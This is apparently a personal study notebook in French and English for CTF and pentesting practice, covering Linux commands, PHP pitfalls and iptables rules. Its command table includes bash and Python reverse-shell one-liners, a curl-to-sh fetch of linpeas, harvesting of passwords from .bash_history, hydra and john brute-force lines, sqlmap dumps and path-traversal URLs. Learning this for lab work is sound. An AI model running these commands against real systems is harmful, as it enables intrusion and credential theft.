**SCIENCE,HACKING***

> *AND SECURITY*

1)  **Linux command**

-   ## list

```{=html}
<!-- -->
```
-   **chown \[-option\] \[-utilisateur\]\[-:groupe\] cible1 \[-cible2
    > ..\] :**

> **Change le propriétaire et le groupe d'un fichier ou**
>
> **dossier.**
>
> **Exemple :**
>
> **chown linux:users file1**
>
> **This command will change the ownership of a file named *file1* to a
> new owner named *linuxsize* and group *users*.**

-   **grep \[-options\] \[-pattern\] \[-file\] :**

> **The grep command is a filter that is used to search for lines
> matching a specified pattern.**
>
> **Exemple :**
>
> **grep "\^hello" file1**
>
> **This command matches all lines that start with 'hello'.**

-   **ps \[-options\] :**

> **La commande ps affiche les processus machines en cours
> d\'exécution.**

-   **ldd \[-options\] \[-file\] :**

> **Cette commande (de l\'anglais *List Dynamic Dependencies*) est un
> [utilitaire](https://fr.wikipedia.org/wiki/Logiciel_utilitaire)
> [Unix](https://fr.wikipedia.org/wiki/Unix) affichant les
> [bibliothèques logicielles
> partagées](https://fr.wikipedia.org/wiki/Biblioth%C3%A8que_logicielle)
> d\'un programme.**

-   **printenv \[\--help\] \[\--version\] \[variable...\] :**

**Affiche toutes les variables d\'environnements.**

-   **objdump \[-options\] \[objfile...\] :**

**This command is used to provide thorough information on**

> **object files.**
>
> **Options :**

-   **-TC : Peut servir à observer les fonctions utilisées dans un
    > fichier exécutable.**

```{=html}
<!-- -->
```
-   **size \[-options\] \[objfile...\] :**

**Permet de connaître les différentes sections d\'un programme**

> **et de leur adresse mémoire.**

-   **strace \[option\] command :**

> **The strace command in Linux lets you trace system calls and signals
> (ltrace do almost the same).**
>
> **Options :**

-   **-c : print in summary**

-   **-n : all system calls**

```{=html}
<!-- -->
```
-   **wc \[option\].. \[entry\].. :**

> **wc stands for word count. Command for printing newline, word and
> byte counts for files.**
>
> **Example:**
>
> ![](media/image156.png){width="4.8125in"
> height="0.7916666666666666in"}

-   **"4" : number of characters.**

  -----------------------------------------------------------------------
  **1**                   **1**                   **4**
  ----------------------- ----------------------- -----------------------
  **number of lines**     **number of words**     **number of bytes**

  -----------------------------------------------------------------------

-   **fg \[cible\]:**

> **The fg command switches a job running in the background into the
> foreground. Can be used with "&" ( put in background and then put in
> foreground ).**

-   **file \[FILE\]:**

**Print the file type:**

-   **strip \[options\] \[FILE\] :**

> **﻿The strip command discards symbols from compiled object
> [files](https://www.computerhope.com/jargon/o/objefile.htm). ﻿It can
> also be useful for making it more difficult to reverse-engineer the**
> [**compiled**](https://www.computerhope.com/jargon/c/compile.htm)
> **[code](https://www.computerhope.com/jargon/c/code.htm).**

-   **readelf \[options\] \[ELF-FILE\]**

> **readelf displays information about one or more ELF format object
> files. The options control what particular information to display.**

-   **hachoir-subfile \[FILE\] :**

> **Extrait des fichiers (non compressés, non chiffrés et non
> fragmentés) contenus dans d\'autres fichiers.**

-   **su \[USER_NAME\] :**

> **Switch the current user.**

-   **pstree \[OPTIONS\] :**

> **Affiche l'arborescence des processus.**

-   **mktemp \[OPTIONS\] \... :**

> **Create a temporary file or directory.**

-   **trap \[OPTIONS\] \... :**

> **Defines and activates handlers to be run when the shell receives
> signals or other special conditions..**

**Some useful commands and tool :**

+--------------------------------+-------------------------------------+
| **tail \--bytes=+425           | **Write the file "crackme_wtf" from |
| crackme_wtf \> Crackmew**      | the 425 bytes in a file named       |
|                                | "Cracknew".**                       |
+================================+=====================================+
| **man 3 \[SYSTEM_FUNCTION\]**  | **Display the prototype of the      |
|                                | function**                          |
+--------------------------------+-------------------------------------+
| **uftrace \--force -a          | **Detect dynamic library calls**    |
| ./random**                     |                                     |
+--------------------------------+-------------------------------------+
| **objdump -d \[FILE\]**        | **Display assembler contents of     |
|                                | executable sections**               |
+--------------------------------+-------------------------------------+
| **export -n \[ENV_VAR\]**      | **Supprime la variable              |
|                                | d\'environnement**                  |
+--------------------------------+-------------------------------------+
| **readelf -d \[FILE_PATH\] \|  | **Read the dynamic section to       |
| grep -e RPATH -e RUNPATH**     | extract the RPATH/RUNPATH.**        |
+--------------------------------+-------------------------------------+
| **objdump -x \[FILE_PATH\] \|  | **to check if an application uses   |
| grep RPATH**                   | RPATH options.**                    |
+--------------------------------+-------------------------------------+
| **objdump -x \[FILE_PATH\] \|  | **to check if an application uses   |
| grep RUNPATH**                 | RUNPATH options.**                  |
+--------------------------------+-------------------------------------+
| **cat \[FILE1\] \> \[FILE2\]** | **Copier le contenu d'un fichier    |
|                                | dans un autre en l\'écrasant (      |
|                                | "\>\>" pour pas l'écraser )**       |
+--------------------------------+-------------------------------------+
| **sudo -u \[USER_NAME\]        | **Executer un fichier avec un autre |
| \[FILE_EXECUTED\]**            | utilisateur**                       |
+--------------------------------+-------------------------------------+
| **﻿COMMAND bash : nm ./binary15 | **Affiche l'adresse de la fonction  |
| \| grep \"shell\"**            | "shell" du programme "binary15".**  |
+--------------------------------+-------------------------------------+
| **./ch7 ﻿ \`python -c \"print   | **Forge l\'argument pour le         |
| \'a\'\*512\"\`**               | programme "ch7" avec une syntax     |
|                                | python.**                           |
+--------------------------------+-------------------------------------+
| **objdump -s ch7**             | **Display the full contents of all  |
|                                | sections requested of ch7 file**    |
+--------------------------------+-------------------------------------+
| **export CHALL=\$( echo -n -e  | **Write Bytes en Bash**             |
| \'\\x96\\x55\' )**             |                                     |
+--------------------------------+-------------------------------------+
| **mv toto.php test**           | **Move toto.php to the directory    |
|                                | "test"**                            |
+--------------------------------+-------------------------------------+
| **ls -a**                      | **Print hidden file**               |
+--------------------------------+-------------------------------------+
| **find /home -name             | **Search for all the files named    |
| .bash_history**                | .bash_history in the /home          |
|                                | directory**                         |
+--------------------------------+-------------------------------------+
| **find /home -name .bashrc     | **Search for all the files named    |
| -exec grep \[PATTERN\] {}      | .bashrc in the /home directory and  |
| \\;**                          | then**                              |
|                                |                                     |
|                                | **for each file, extract            |
|                                | \[PATTERN\] word inside it.**       |
+--------------------------------+-------------------------------------+
| **find . -name .bash_history   | **Search for all the files named    |
| -exec grep -A 1 \'\^passwd\'   | .bash_history in the .directory.**  |
| {} \\;**                       |                                     |
|                                | **for each file, extract "passwd"   |
|                                | word inside it in case it is placed |
|                                | first in the line ("\^") and print  |
|                                | one more following line ("-A 1).**  |
|                                |                                     |
|                                | **Utile si quelqu'un a utilisé la   |
|                                | commande passwd puis écrit son mot  |
|                                | de passe dans le terminal.**        |
+--------------------------------+-------------------------------------+
| **ls -ld \[DIRECTORY\]**       | **print permission on a directory** |
+--------------------------------+-------------------------------------+
| **tar -xzvf \[ FILE \]\[tar.gz | **Décompresser le fichier file de   |
| \| tgz \]**                    | type tar.gz ou tgz.**               |
+--------------------------------+-------------------------------------+
| **tar -jxvf \[ FILE \].tbz**   | **Décompresser le fichier file de   |
|                                | type tbz.**                         |
+--------------------------------+-------------------------------------+
| **echo -n                      | **décode la chaîne de caractère en  |
| \"OR9hcp18+C1bChK10NlRRg==\"   | base64 puis l'affiche en Hexa**     |
| \| base64 -D \| hexdump -C**   |                                     |
+--------------------------------+-------------------------------------+
| **python -m SimpleHTTPServer** | **Ouvre un serveur web rapidement** |
+--------------------------------+-------------------------------------+
| **find / -writeable -type d    | **Afficher tous les fichiers        |
| 2\>/dev/null**                 | autorisés en écriture.**            |
+--------------------------------+-------------------------------------+
| **bash -i \>&                  | **Reverse shell in bash**           |
| /dev/tcp/\[HOST\]/\[PORT\]     |                                     |
| 0\>&1**                        |                                     |
+--------------------------------+-------------------------------------+
| **python -c \'import           | **reverse shell en python (         |
| socket,                        | exécution bash )**                  |
| subprocess,os;s=socket.socket( |                                     |
| socket.AF_INET,socket.SOCK_STR |                                     |
| EAM);s.connect((\"\<IP\>\",\<P |                                     |
| ORT\>));os.dup2(s.fileno(),0); |                                     |
| os.dup2(s.fileno(),1);         |                                     |
| os.dup2(s.fileno(              |                                     |
| ),2);p=subprocess.call(\[\"/** |                                     |
|                                |                                     |
| **bin/sh\",\"-i\"\]);\'**      |                                     |
+--------------------------------+-------------------------------------+
| **python -c \"import           | **Avoir une bonne interface sur le  |
| pt                             | shell**                             |
| y;pty.spawn(\'/bin/bash\')\"** |                                     |
+--------------------------------+-------------------------------------+
| **mv \[FILE1\] \[FILE2\]**     | **rename a file**                   |
+--------------------------------+-------------------------------------+
| **curl                         | **Install and Run linpeas.sh**      |
| https://raw.githubuserco       |                                     |
| ntent.com/carlospolop/privileg |                                     |
| e-escalation-awesome-scripts-s |                                     |
| uite/master/linPEAS/linpeas.sh |                                     |
| \| sh**                        |                                     |
+--------------------------------+-------------------------------------+
| **john                         | **Brute les hash du fichier         |
| \--wordlist=/u                 | /etc/shadow**                       |
| sr/share/wordlists/rockyou.txt |                                     |
| shadowfile**                   |                                     |
+--------------------------------+-------------------------------------+
| **sqlmap -r \[FILE\] \--dbs    | **sqlmap avec un fichier ou se      |
| \--batch**                     | retrouve la forme de la requête     |
|                                | avec les paramètre**                |
| **sqlmap -r \[FILE\] -D        |                                     |
| \[DATABASE_NAME\] -T           | **qu'on essaye d'exploiter.**       |
| \[TABLES_NAMES\] \--dump       |                                     |
| \--batch**                     | **-D : vise une database précise.** |
|                                |                                     |
|                                | **-T : table précise**              |
+--------------------------------+-------------------------------------+
| **hydra -L \[wordlist_user\]   | **BruteForce a certain login page   |
| -P \[wordlist_passwd\]         | o**                                 |
| \[IP/DOMAINE\] -f**            |                                     |
|                                |                                     |
| **http-get                     |                                     |
| \[URL_OF_LOGIN_PAGE\]**        |                                     |
+--------------------------------+-------------------------------------+
| **dirb \[URL\] -u              | **bruteforce un URL accessible avec |
| \[USERNAME:PASSWD\]**          | un username/passwd**                |
|                                |                                     |
| **-X                           |                                     |
| \[                             |                                     |
| .EXTENSION,.EXTENSION,\...\]** |                                     |
+--------------------------------+-------------------------------------+
| **echo \"\[HEXA_STRING\]\" \|  | **Convertir une chaîne hexadécimale |
| xxd -p -r**                    | en ASCII**                          |
+--------------------------------+-------------------------------------+
| **hydra -l root -P             | **brute password sur mysql avec     |
| /u                             | hydra ( sur le port ouvert pour )** |
| sr/share/wordlists/rockyou.txt |                                     |
| \<IP\> mysql**                 | -   **l : username**                |
|                                |                                     |
|                                | -   **P : password to test**        |
+--------------------------------+-------------------------------------+
| **mysql -h \<IP\> -u root -p   | **Se connecte sur la database mysql |
| robert**                       | de l\'hôte \<IP\> avec le compte    |
|                                | root et le mot de passe robert**    |
+--------------------------------+-------------------------------------+
| **gobuster dir -u              | -   **dir : mode bruteforce sur les |
| \[IP_ADDRESS\] -w              |     > directories**                 |
| /usr/s                         |                                     |
| hare/dirb/wordlists/common.txt | **Bruteforce by specific some       |
| -x                             | extensions**                        |
| php,php.bak,html,txt,bak,old   |                                     |
| -s 200**                       | ![](media/image9                    |
|                                | 2.png){width="2.9791666666666665in" |
|                                | height="0.8194444444444444in"}      |
+--------------------------------+-------------------------------------+
| **gobuster vhost -u            | **In vhosts mode the tool is        |
| \[IP_ADDRESS\] -w              | checking if the subdomain exists by |
| /usr/share/dirbuster/wordlists | visiting the formed url and         |
| /directory-list-2.3-medium.txt | verifying the IP address.**         |
| \| grep \"Status: 200\"**      |                                     |
+--------------------------------+-------------------------------------+
| **/usr/share/john/ssh2john.py  | **Convert the private encrypted     |
| \[RSA/DSA/EC/OpenSSH private   | keys in the file provided into a    |
| key file(s)\]**                | crackable hash for John ( to find   |
|                                | ssh password for example ).**       |
+--------------------------------+-------------------------------------+
| **pspy64s**                    | **Help us enumerate pesky files or  |
|                                | permission of different files       |
|                                | across the system.**                |
+--------------------------------+-------------------------------------+
| **scp \'-P \[PORT\]\'          | **Télécharger un fichier depuis un  |
| \[REMOTE_HO                    | machine distante SSH**              |
| ST_NAME\]@\[IP\]:\[PATH_FILE\] |                                     |
| \[INTERN_PATH\]**              |                                     |
|                                |                                     |
| **exemple : scp \'-P 2221\'    |                                     |
| \[SOURCE\] \[DESTINATION\]**   |                                     |
|                                |                                     |
| **scp \'-P 2225\'              |                                     |
| app-systeme-ch73@              |                                     |
| challenge05.root-me.org:/chall |                                     |
| enge/app-systeme/ch73/ch73.exe |                                     |
| /home/kali**                   |                                     |
+--------------------------------+-------------------------------------+
| **unzip myfile.zip**           | **Dézipper un file .zip**           |
+--------------------------------+-------------------------------------+
| **hydra -L                     | **BruteForce ssh credentials with   |
| \[USERS_WORDLIST_FILE\] -p     | one password**                      |
| \[PASSWD\] \[IP\] ssh**        |                                     |
+--------------------------------+-------------------------------------+
| **netdiscover**                | **Découvre toutes les hosts dans un |
|                                | même réseau.**                      |
| **arp-scan \--localnet**       |                                     |
+--------------------------------+-------------------------------------+
| **wpscan \--url "\[URL\]"      | **Trouver des vulnérabilité si il y |
| \--enumerate**                 | a Wordpress utiliser**              |
+--------------------------------+-------------------------------------+
| **wpscan \--url "\[URL\]" -U   | **Bruteforcer le mdp d'un user sur  |
| \[USER_NAME\] -P               | wordpress**                         |
| \[WORDLIST\]**                 |                                     |
+--------------------------------+-------------------------------------+
| **cewl**                       | **CeWL is a ruby app which spiders  |
|                                | a given url to a specified depth,   |
| **cewl "\[URL\]" \>            | optionally following external       |
| cewl3.txt**                    | links, and returns a list of words  |
|                                | which can then be used for password |
|                                | crackers such as John the Ripper**  |
+--------------------------------+-------------------------------------+
| **tr -d '\\n' \[TEXT\]**       | **Remove '\\n' from the input       |
|                                | text.**                             |
+--------------------------------+-------------------------------------+
| **sudo update-alternatives     | **Changer la configuration de       |
| \--config java**               | java**                              |
+--------------------------------+-------------------------------------+
| **ftp \[IP\]**                 | **Se connecter sur le port Ftp**    |
+--------------------------------+-------------------------------------+
| **dig @\[IP\] \[DOMAIN\]       | **Can help to find subdomain on a   |
| axfr**                         | given domain**                      |
+--------------------------------+-------------------------------------+
| **dirsearc**h                  | **For Directory brute forcing**     |
+--------------------------------+-------------------------------------+
| **"Firefox_Decrypt"**          | **Obtain credentials of FireFox     |
|                                | navigateur from it directory on     |
|                                | Linux**                             |
+--------------------------------+-------------------------------------+
|                                |                                     |
+--------------------------------+-------------------------------------+
| **nikto -h                     | **Nikto is a popular Web server     |
| http://192.168.1.103/dav/**    | scanner that tests Web servers for  |
|                                | dangerous files/CGIs, outdated      |
|                                | server software and other issues.   |
|                                | It also performs generic and server |
|                                | type specific checks**              |
|                                |                                     |
|                                | **Also Provide if HTTP PUT method   |
|                                | is allowed.**                       |
+--------------------------------+-------------------------------------+
| **cadaver \[URL/dav/\]**       | **Cadaver is a command line that    |
|                                | enables the uploading and           |
| **{ CAVAVER_INTERFACE : }put   | downloading of a file on WebDAV.**  |
| \[REVERSE_SHELL.PHP\]**        |                                     |
|                                | **To verify whether the file is     |
|                                | uploaded or not, run the URL:       |
|                                | \[URL\]/dav/ on the browser.**      |
|                                |                                     |
|                                | ![](media/image3                    |
|                                | 9.png){width="2.6458333333333335in" |
|                                | height="0.40625in"}                 |
+--------------------------------+-------------------------------------+
| **php -S localhost:8000**      | **Serveur php**                     |
+--------------------------------+-------------------------------------+
| **knock \[IP\] 7469 8475 9842  | **Effectue une séquence pour le     |
| .. \[PORT\]**                  | "Port knocking " Après que la bonne |
|                                | séquence est effectuée, le port en  |
|                                | question s'ouvre ( n'est plus       |
|                                | filtered .**                        |
+--------------------------------+-------------------------------------+
| **fcrackzip -u -D -p           | **bruteforce zip password**         |
| \'/usr                         |                                     |
| /share/wordlists/rockyou.txt\' |                                     |
| numbers.zip**                  |                                     |
+--------------------------------+-------------------------------------+
| **crunch \<min\> \<max\>       | **Generate Custom wordlist :**      |
| \[OPTIONS ...\]**              |                                     |
|                                | **"\<min\>\<max\>" : size of the    |
|                                | generated words**                   |
+--------------------------------+-------------------------------------+
| **gcc ... -static ....**       | **L'option static dans les          |
|                                | paramètres de compilation permet en |
|                                | quelque sorte d'intégrer les        |
|                                | bibliothèques dynamiques à notre    |
|                                | binaire plutôt que de faire une     |
|                                | liaison.**                          |
|                                |                                     |
|                                | **La conséquence est que le binaire |
|                                | aura une taille plus conséquente.** |
|                                |                                     |
|                                | **Cela rend une attaque de type ROP |
|                                | largement plus facile à effectuer.  |
|                                | :)**                                |
+--------------------------------+-------------------------------------+
| **chisel \[OPTIONS\]**         | **Chisel is a fast TCP tunnel,      |
|                                | transported over HTTP, secured via  |
|                                | SSH**                               |
+--------------------------------+-------------------------------------+
| **showmount -e 192.168.10.10** | **showmount command shows           |
|                                | information about an NFS server**   |
|                                |                                     |
|                                | **-e : Print the list of exported   |
|                                | filesystems**                       |
+--------------------------------+-------------------------------------+
| **XSSstrike**                  | **Puissant Scanner de XSS**         |
+--------------------------------+-------------------------------------+
| **find . -name \\\*.xml**      | **Find all XML file in current      |
|                                | directory**                         |
+--------------------------------+-------------------------------------+
| **ln -s                        | **Create a symbolic link**          |
| \[chemi                        |                                     |
| n/vers/le/dossier/existant\]** |                                     |
+--------------------------------+-------------------------------------+
| **Mono \[FILE.EXE\]            | **Execute .exe on linux**           |
| \--options**                   |                                     |
+--------------------------------+-------------------------------------+
| **chaosreader \[FILE.PCAP\]**  | **This tool will analyze and        |
|                                | extract session information and     |
|                                | files from .PCAP**                  |
+--------------------------------+-------------------------------------+
| **http                         | **DOM based sink scanner**          |
| ://domxssscanner.geeksta.net** |                                     |
+--------------------------------+-------------------------------------+
| **searchsploit -w \[MOT_GREP\] | **search vulnérabilité pour les     |
| \[MOT_GREP\] \[MOT_GREP\]**    | mots recherchées ( linux, DB, ... ) |
|                                | en affichant le liens vers          |
|                                | exploit-db**                        |
+--------------------------------+-------------------------------------+
| **searchsploit \[MOT_GREP\]    | **search vulnérabilité pour les     |
| \[MOT_GREP\] \[MOT_GREP\]**    | mots recherchées ( linux, DB, ... ) |
|                                | en affichant le path ( sur Kali )   |
|                                | vers un fichier.c pour effectuer    |
|                                | l'exploitation de la vuln.**        |
+--------------------------------+-------------------------------------+
| **hash-identifier**            | **Pour Identifier le type d'un      |
|                                | hash**                              |
+--------------------------------+-------------------------------------+
| **ht**                         | **editeur cool sur linux (          |
|                                | fonctionne avec les touches         |
|                                | F1,F2,F3,\... )**                   |
+--------------------------------+-------------------------------------+
| tar -zcvf shell.tar.gz         | to tar and zip the reverse shell    |
| shell.php                      | file                                |
+--------------------------------+-------------------------------------+
| **sudo passwd                  | **changer le mdp d'un utilisateur** |
| \[nom_utilisateur\]**          |                                     |
+--------------------------------+-------------------------------------+
| **zip -r \[OUTPUTFILE\]        | **Zipper un dossier**               |
| \[DIR\]**                      |                                     |
+--------------------------------+-------------------------------------+
| **aquatone**                   | **Find subdomains, port scan ,      |
|                                | discover vuln \...**                |
+--------------------------------+-------------------------------------+
| **sudo netstat -plten \| grep  | **Kill a process running on a       |
| \[PORT\]**                     | port**                              |
|                                |                                     |
| **kill -9 \[PROCESS_ID\]**     |                                     |
+--------------------------------+-------------------------------------+
| **hydra -V -f -L               | **Bruteforce RDP**                  |
| /root/Desktop/user.txt -P      |                                     |
| /root/Desktop/dict.txt         |                                     |
| rdp://192.168.0.102**          |                                     |
+--------------------------------+-------------------------------------+
| **(python -c \"print           | **argument pour la fonction read**  |
| \'a\'\*50\";cat) \| ./ch65**   |                                     |
+--------------------------------+-------------------------------------+
| **dmesg**                      | **commande sur les systèmes         |
|                                | d\'exploitation de type Unix qui    |
|                                | affiche la mémoire tampon de        |
|                                | message du noyau.**                 |
+--------------------------------+-------------------------------------+
| **lsmod**                      | **Connaître tous les modules du     |
|                                | kernel actifs ( Un module est un    |
|                                | morceau de code permettant          |
|                                | d\'implémenter des fonctionnalités  |
|                                | au noyau ).**                       |
|                                |                                     |
|                                | **Les modules sont exécutés dans    |
|                                | l\'espace mémoire du noyau.**       |
+--------------------------------+-------------------------------------+
| **modinfo \[ NAME_MODULE\]**   | **get info on kernel module**       |
+--------------------------------+-------------------------------------+
| **ps -eaf**                    | **check the processes running on a  |
|                                | machine**                           |
+--------------------------------+-------------------------------------+
| **capsh \--print**             | **Check the capabilities provided   |
|                                | in a docker container**             |
+--------------------------------+-------------------------------------+
| **fdisk -l**                   | **List the disks on the local       |
|                                | machine.**                          |
+--------------------------------+-------------------------------------+
| **chroot ./ \[COMMAND\]**      | **La commande chroot permet de      |
|                                | changer le répertoire racine vers   |
|                                | un nouvel emplacement.**            |
|                                |                                     |
|                                | **COMMAND : command to execute just |
|                                | after chroot.**                     |
+--------------------------------+-------------------------------------+
| **nc -v -n -w2 -z \[IP\]       | **alternative to scan port without  |
| 1-65535**                      | nmap ( with netcat )**              |
+--------------------------------+-------------------------------------+
| **nc 172.17.0.1 2222**         | **Identify the service running on   |
|                                | port 2222 on the machine with the   |
|                                | IP address 172.17.0.1.**            |
+--------------------------------+-------------------------------------+
| **cat sshd_config \| grep      | **Check whether SSH root login is   |
| PermitRootLogin**              | permitted**                         |
+--------------------------------+-------------------------------------+
| **sessions**                   | **MSFCONSOLE : list all sessions**  |
+--------------------------------+-------------------------------------+
| **sessions -i 1**              | **MSFCONSOLE : enter in meterpreter |
|                                | mode on a session.**                |
+--------------------------------+-------------------------------------+
| zip2john chall.zip \> zippy    | Brute force ZIP file.               |
|                                |                                     |
| john zippy                     |                                     |
| \--wordlist=/u                 |                                     |
| sr/share/wordlists/rockyou.txt |                                     |
+--------------------------------+-------------------------------------+
| nbtscan-1.0.35.exe             | Scan Netbios name and dc            |
| 192.168.1.0/24                 |                                     |
+--------------------------------+-------------------------------------+
|                                |                                     |
+--------------------------------+-------------------------------------+
|                                |                                     |
+--------------------------------+-------------------------------------+
|                                |                                     |
+--------------------------------+-------------------------------------+
|                                |                                     |
+--------------------------------+-------------------------------------+
|                                |                                     |
+--------------------------------+-------------------------------------+
|                                |                                     |
+--------------------------------+-------------------------------------+
|                                |                                     |
+--------------------------------+-------------------------------------+

-   ## Nmap commands

![](media/image321.png){width="5.791338582677166in"
height="8.277777777777779in"}

#  About PHP

-   ## PHP - Difference between ' and ":

**Single-quoted strings doesn't consider special case ( like '\$' for**

> **variable,'\\n' for newline ,..).**
>
> **Double-quoted strings are considered special cases.**
>
> **﻿So for the performance people: use single quote.**

-   **This language is written in "C".**

```{=html}
<!-- -->
```
-   ## PHP - Path and dot truncation :

**On most PHP installations, a filename longer than 4096**

> **bytes will be cut off so any excess chars will be thrown**
>
> **away.**
>
> **Example :**

**http://example.com/index.php?page=../../../etc/passwd\...\...\...\...\[ADD
MORE\]**

**http://example.com/index.php?page=../../../etc/passwd\\.\\.\\.\\.\\.\\.\[ADD
MORE\]**

**http://example.com/index.php?page=../../../etc/passwd/./././././.\[ADD
MORE\]**

**http://example.com/index.php?page=../../../\[ADD
MORE\]../../../../etc/passwd**

-   ## PHP - Loose comparaison :

> **Faire attention à utiliser "===" à la place de "==" sur des
> comparaisons sensibles ( voir tableau associé ).**
>
> **Examples Loose comparaison**

  -----------------------------------------------------------------------
  **5 == "5"**                        **PHP will attempt to convert the
                                      string to an integer, meaning that
                                      5 == \"5\" evaluates to true.**
  ----------------------------------- -----------------------------------
  **5 == \"5 of something\"**         **﻿PHP will effectively convert the
                                      entire string to an integer value
                                      based on the initial number. The
                                      rest of the string is ignored
                                      completely.**

  **0 == \"Example string\"**         **Evaluated true. PHP treats this
                                      entire string as the integer 0.**

  **TRUE == \"Example string\"**      **Evaluated true.**

  **\'0e1\' == \'00e2\'==             **"0e\[NOMBRE\]" est traité par PHP
  \'0e1337\'(que des nombre après le  comme 0 à la puissance \[NOMBRE\]**
  "e") == \'0\'**                     

                                      

                                      
  -----------------------------------------------------------------------

-   ## PHP - preg_replace exploit :

> **Exemple :
> ﻿[[preg_replace]{.underline}](http://www.php.net/preg_replace)(\"/a/e\",\"print_r(scandir(\'.\'))\",\"abcd\");**

-   **Sur cette exemple, la commande change la lettre "*a*" dans
    > "*abcd*" par l\'expression du milieu.**

```{=html}
<!-- -->
```
-   **le "/e" sur le premier champ permet d\'exécuter la commande sur le
    > champ de au milieu.**

**Le rôle de PHP est de générer du code HTML, code qui est ensuite
envoyé au client de la même manière qu\'un site statique.**

-   **Parmi les concurrents de PHP, on peut citer les suivants :**

    -   **ASP.NET ( bien connu des développeurs C# ).**

    -   **Ruby on Rails ( utilise avec le langage Ruby ).**

    -   **Django ( utilise le langage python ).**

    -   **\[JSP, JRE, ...\] pour le langage JAVA.**

```{=html}
<!-- -->
```
-   ![](media/image273.png){width="5.333333333333333in"
    > height="1.125in"}

```{=html}
<!-- -->
```
-   ## Cookies vs. sessions ( no PHP ) :

![](media/image90.png){width="6.267716535433071in" height="2.875in"}

![](media/image266.png){width="6.267716535433071in"
height="1.1527777777777777in"}

**An implementation :**

**Store a unique cookie value on the client, and store persistent data
in the database along with that cookie value. Then on page requests I
matched up those values and had my persistent data without letting the
client control what that was.**

#  Iptables

-   **Iptables can be run only by root.**

-   **Netfilter CHAINS :**

    -   **INPUT : used for filtering incoming packets. Out host is the
        > packet destination**

    -   **OUTPUT : used for filtering outgoing packets. Our host is the
        > source of the packet.**

    -   **FORWARD : used for filtering routed packets. Our host is
        > router.**

    -   **PREROUTING : used for DNAT / Port Forwarding.**

    -   **POSTROUTING : used for SNAT ( MASQUERADE ).**

-   **You can create your own chain.**

```{=html}
<!-- -->
```
-   **Using a name domain on the rule could not block the connection to
    > the target site because they may use multiple IP addresses for one
    > domain and you only filtered one or some.**

```{=html}
<!-- -->
```
-   **Netfilter Tables:**

    -   **filter :**

        -   **Default table for Iptables.**

        -   **Where the decision of accepting or dropping packets is
            > taken.**

        -   **Built-in chains : INPUT, OUTPUT and FORWARD.**

    -   **nat :**

        -   **Specialized for SNAT and DNAT (Port forwarding)**

        -   **Built-in chains : PREROUTING, POSTROUTING and OUTPUT ( for
            > locally generated packets).**

    -   **mangle :**

        -   **Specialized for packet alteration ( on headers, ...).**

        -   **Built-in chains : All.**

    -   **raw :**

        -   **Stateful table**

        -   **Built-in chains : PREROUTING and OUTPUT.**

        -   **Use to set a mark on packets that should not be handled by
            > the connection tracking system**

```{=html}
<!-- -->
```
-   **We can redefine the default chain policy that is applied after all
    > rules were executed.**

```{=html}
<!-- -->
```
-   **The order used for the rules is very important in the process.**

```{=html}
<!-- -->
```
-   **Netfilter command :**

    -   **General Syntax :**

> **iptables \[-t TABLE_NAME\] \[-COMMAND\] \[CHAIN\] \[matches\] \[-j
> TARGET\]**
>
> **\[-t TABLE_NAME\] : Indicates on which table the command operates.
> By default it is the *Filter* table.**
>
> **\[-COMMAND\] : Indicates the operation we perform on a chain of the
> table.**
>
> **\[CHAIN\] : Indicates on which chain the command operates.**
>
> **\[matches\] : Indicates some conditions , characteristic to the
> packet that we need to perform an action.**

**\[-j TARGET\] : Indicates what action is taken on**

> **packets.**

-   **Iptables \[-t TABLE_NAME\] -L -vn \[CHAIN\]:**

> **Print the rules of the specified table (*Filter* by default).**
>
> **Option -vn for more details.**

-   **Differents common options for \[-COMMAND\]:**

  -----------------------------------------------------------------------
  **-A**                               **Append the rule to the end of
                                       the selected chain.**
  ------------------------------------ ----------------------------------
  **-I \[CHAIN\] \[POSITION\]**        **Insert one or more rules in the
                                       selected chain on a specific
                                       position, by default on top
                                       (position 1).**

  **-L**                               **List all rules in the selected
                                       chain. If no chain is selected,
                                       all chains are listed.**

  **\[-t TABLE_NAME\] -F**             **Flush the selected chain ( all
                                       the chains in the table if none is
                                       given).**

  **\[-t TABLE_NAME\] -Z**             **Zero (reset) the packet and byte
                                       counters in all chains, or only
                                       the given chain.**

  **-N**                               **Create a new user-defined chain
                                       by the given name.**

  **\[-t TABLE_NAME\] -X**             **Delete the user-defined chain
                                       specified ( delete all
                                       user-defined chains if a chain is
                                       not specified).**

  **-P \[CHAIN\] \[ACTION\]**          **Set the default policy for the
                                       built-in chain (INPUT, OUTPUT or
                                       FORWARD).**

  **-D**                               **Delete one or more rules from
                                       the selected chain.**

  **-R**                               **Replace a rule in the selected
                                       chain.**
  -----------------------------------------------------------------------

-   **Differents common options for \[-matches\]:**

+------------------------------------+---------------------------------+
| **-s \--source \[IP address \|     | **Match by source IP Network    |
| network address \| domain name     | Address**                       |
| \]**                               |                                 |
+====================================+=================================+
| **-d \--destination \[IP address   | **Match by destination IP       |
| \| network address \| domain name  | Network Address**               |
| \]**                               |                                 |
+------------------------------------+---------------------------------+
| **-m iprange \--src-range          | **Match by IP Range for         |
| \[IP_start-IP_end\]**              | source**                        |
+------------------------------------+---------------------------------+
| **-m iprange \--dst-range          | **Match by IP Range for         |
| \[IP_start-IP_end\]**              | destination**                   |
+------------------------------------+---------------------------------+
| **-m addrtype \--src-type          | **Match by Address Type for     |
| \[UN                               | source**                        |
| ICAST,MULTICAST,BROADCAST,\...\]** |                                 |
+------------------------------------+---------------------------------+
| **-m addrtype \--dst-type          | **Match by destination Type for |
| \[UN                               | source**                        |
| ICAST,MULTICAST,BROADCAST,\...\]** |                                 |
+------------------------------------+---------------------------------+
| **-p \[tcp \| udp \] \--dport      | **Match by a single destination |
| \[PORT\]**                         | port**                          |
+------------------------------------+---------------------------------+
| **-p \[tcp \| udp \] \--sport      | **Match by a single source      |
| \[PORT\]**                         | port**                          |
+------------------------------------+---------------------------------+
| **-m multiport                     | **Match by multiple ports**     |
| \[\--dports\|\--sports\] \[PORT1,  |                                 |
| PORT2, .. \]**                     |                                 |
+------------------------------------+---------------------------------+
| **-i \[incoming_interface\]**      | **Match by incoming interface** |
|                                    |                                 |
|                                    | **Available for : INPUT,        |
|                                    | FORWARD and PREROUTING.**       |
+------------------------------------+---------------------------------+
| **-o \[outgoing_interface\]**      | **Match by outgoing interface** |
|                                    |                                 |
|                                    | **Available for : OUTPUT,       |
|                                    | FORWARD and POSTROUTING.**      |
+------------------------------------+---------------------------------+
| **-p \[PROTOCOL\]**                | **Match by protocol**           |
+------------------------------------+---------------------------------+
| **! \[matches\]**                  | **Negating Matches**            |
+------------------------------------+---------------------------------+
| **\--syn**                         | **Match if the syn flag in      |
